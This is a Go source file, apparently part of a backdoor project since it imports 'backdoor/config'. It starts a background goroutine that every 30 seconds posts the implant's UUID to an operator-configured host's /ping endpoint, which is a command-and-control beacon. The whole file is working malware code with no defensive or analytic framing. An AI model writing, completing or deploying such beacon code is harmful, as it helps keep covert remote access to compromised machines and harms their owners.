package handler

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"
	"time"

	"backdoor/config"
)

func StartPingRoutine() {
	ticker := time.NewTicker(30 * time.Second)

	go func() {
		for {
			<-ticker.C
			sendPing()
		}
	}()
}

func sendPing() {
	payload := map[string]string{
		"id": config.UUID,
	}
	data, _ := json.Marshal(payload)

	resp, err := http.Post("http://"+config.Host+":"+config.Port+"/ping", "application/json", bytes.NewBuffer(data))
	if err != nil {
		log.Println("Error enviando ping:", err)
		return
	}
	defer resp.Body.Close()

	log.Println("Ping enviado. Código:", resp.StatusCode)
}
